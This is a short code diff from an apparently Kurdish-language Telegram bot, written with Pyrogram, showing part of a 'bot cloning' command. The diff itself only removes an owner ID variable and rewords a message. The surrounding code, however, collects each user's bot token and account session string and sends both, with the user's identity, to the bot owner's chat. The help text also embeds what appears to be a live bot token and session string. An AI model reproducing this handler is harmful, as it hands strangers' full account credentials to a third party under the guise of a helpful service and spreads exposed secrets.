@@ -421,12 +421,9 @@ async def codev2(client, message):
     )
 
 
-OWNERdd = "474468585"
-
 
 from pyrogram import Client, filters
 from pyrogram.types import ChatPrivileges, InlineKeyboardButton, InlineKeyboardMarkup
-
 
 @app.on_message(filters.command(["دروستکردنی بۆت", "• دروستکردنی بۆت •"], ""))
 async def cloner(app: Client, message):
@@ -456,13 +453,14 @@ async def cloner(app: Client, message):
             "**• تکایە تۆکنی بۆت و کۆدی یاریدەدەر بنووسە لەگەڵ فەرمان:**\n- بەم شێوازەی خوارەوە\n- دروستکردنی بۆت + `تۆکنی بۆت` + `کۆدی یاریدەدەر`\n\n- نموونە\n-` دروستکردنی بۆت 7155835267:AAFkHDtkjO8k9P6T_okNQJJdfDQPU13oLI4 AgDFycsAdTlYSLcV1hcO66u-XkAvGTzu3sxlXFpmajfq3aLE6jjC7khfIzByLz-iacINnEQIGeWP7XV7kllN1cx_jvCej1_MgmPgYELrw8BUNvKUARCKsnNc-GvJme0RziX6Gs3cv6J8x0fINr-IBDFv2Gd_WHWCA4qs0-nkfgg6hgHX7ny37TsF7Ne_nG_SLTLE7za-r6yWZynx6-gKF5nGTQs0FFzFyCHt2-Xp4xArmDRp_vz68E1r1FHQ88AQSCeNc6w5AjoLJu-pCkaZVeCagxba04OSHpRAgSvj4mdrZu_puEFKKuyZAbeD3vebdTaHbxyT4AQ34cZjbCFZ4cD3YgZDIQAAAAAxrBH9AA`\n\n- با بۆشایی هەبێت لە نێوان تۆکن و کۆدەکە"
         )
         return
+
     # Get the bot token and session string from the command
     token = message.command[1]
     session = message.command[2]
 
     # Start the bot and check token validity
     try:
-        await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
+        await message.reply_text("**◗⋮◖ پشکنین بۆ زانیارییەکان دەکرێت ..⚡.**")
         bot = Client(
             "Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True
         )
@@ -542,7 +540,6 @@ async def cloner(app: Client, message):
         OWNER[0],
         f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : {token} 🚦⚡.\n◗⋮◖ کۆدی یاریدەدەر : {session} 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n◗⋮◖ ئایدی : {message.chat.id} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {loggerlink} 🚦⚡.**",
     )
-
 
 @app.on_message(filters.command(["سڕینەوەی بۆت", "• سڕینەوەی بۆت •"], ""))
 async def delbot(client: app, message):
